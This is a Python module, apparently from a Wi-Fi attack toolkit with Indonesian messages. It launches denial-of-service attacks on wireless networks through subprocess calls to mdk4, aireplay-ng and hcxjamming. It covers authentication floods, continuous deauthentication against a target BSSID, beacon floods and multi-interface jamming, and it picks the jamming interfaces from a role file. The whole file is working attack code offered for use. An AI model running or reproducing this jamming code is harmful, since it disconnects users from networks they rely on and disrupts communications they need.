import subprocess
from app.services.interface import get_monitor_interfaces
from app.services.logger import log_event
from app.services.interface import load_interface_roles



def run_auth_flood(ifaces, bssid, ssid, speed):
    for iface in ifaces:
        subprocess.Popen(["mdk4", iface, "a", "-a", bssid, "-s", str(speed)])

def run_deauth(iface, bssid):
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", bssid, iface])

def run_beacon_flood(iface):
    subprocess.Popen(["mdk4", iface, "b", "-c", "1-11"])

def run_hcx_jamming(iface, channel, ssid):
    subprocess.Popen(["hcxjamming", iface, channel, ssid])

def run_multi_interface_jamming(bssid, channel, ssid, mode, speed=1000, iface_count=2):
    roles = load_interface_roles()
    jammers = roles.get("jammers", [])

    if len(jammers) < iface_count:
        raise Exception(f"Minimal {iface_count} interface jamming diperlukan. Ditemukan: {len(jammers)}")

    selected_ifaces = jammers[:iface_count]

    for iface in selected_ifaces:
        log_event(f"jam_{mode}", iface, ssid)

        if mode == "auth":
            subprocess.Popen(["mdk4", iface, "a", "-a", bssid, "-s", str(speed)])
        elif mode == "deauth":
            subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", bssid, iface])
        elif mode == "beacon":
            subprocess.Popen(["mdk4", iface, "b", "-c", channel])
        elif mode == "hcx":
            subprocess.Popen(["hcxjamming", iface, channel, ssid])
        else:
            raise Exception(f"Mode tidak dikenali: {mode}")

    return selected_ifaces